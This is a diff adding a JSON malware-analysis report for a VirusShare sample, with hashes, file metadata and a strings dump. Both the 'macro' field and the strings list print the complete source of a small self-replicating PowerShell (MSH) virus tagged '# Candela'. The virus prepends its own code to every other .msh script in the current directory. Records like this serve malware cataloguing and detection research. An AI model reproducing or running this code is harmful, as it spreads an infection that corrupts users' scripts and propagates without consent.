@@ -1,0 +1,44 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "$name_array=get-childitem *.msh\n# Candela\nforeach ($name in $name_array)\n{\n  $cont=get-content $name.Name\n  if ($cont[1] -eq \"# Candela\")\n  {\n    $my_name=$name.Name\n  }\n}\n\n$vir_cont=get-content $my_name\n\nforeach ($name in $name_array)\n{\n  $cont=get-content $name.Name\n  if ($cont[1] -ne \"# Candela\")\n  {\n    echo $vir_cont[0] >$name.Name\n    for ($i=1; $i -lt 23; $i++) { echo $vir_cont[$i] >>$name.Name }\n    echo $cont >>$name.Name\n  }\n}"
+    },
+    "filename": "VirusShare_1b207275e10b82c99cfb817aa4fa10c9",
+    "filesize": 462,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "1b207275e10b82c99cfb817aa4fa10c9",
+        "sha1": "233a20d33ba9e6e95823db575dca2d2dc3198cd0",
+        "sha256": "77290dc64c18f2cb979e93da9a77ffc26e556e43c79885c49cd39738dafdece1"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "$name_array=get-childitem *.msh",
+            "# Candela",
+            "foreach ($name in $name_array)",
+            "  $cont=get-content $name.Name",
+            "  if ($cont[1] -eq \"# Candela\")",
+            "    $my_name=$name.Name",
+            "$vir_cont=get-content $my_name",
+            "foreach ($name in $name_array)",
+            "  $cont=get-content $name.Name",
+            "  if ($cont[1] -ne \"# Candela\")",
+            "    echo $vir_cont[0] >$name.Name",
+            "    for ($i=1; $i -lt 23; $i++) { echo $vir_cont[$i] >>$name.Name }",
+            "    echo $cont >>$name.Name"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.260123",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
